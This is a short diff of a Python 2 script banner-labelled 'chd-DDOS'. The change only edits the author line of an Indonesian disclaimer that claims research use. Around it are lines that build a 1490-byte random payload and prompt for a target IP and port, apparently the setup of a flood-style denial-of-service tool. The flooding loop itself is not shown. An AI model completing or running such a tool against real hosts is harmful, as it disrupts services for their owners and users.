@@ -19,10 +19,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet chd-DDOS")
 print
-print "Author   : Gilang"
-print  "Tools ini dibuat Untuk penelitian"
-print  "Jangan digunakan untuk hal negatif"
-print  "salam script kiddie"
+print     "pembuat:gilang"
+print     "Tools ini dibuat Untuk penelitian"
+print     "Jangan digunakan untuk hal negatif"
+print     "salam script kiddie"
 print
 ip = raw_input("IP Target : ")
 port = input("Port       : ")
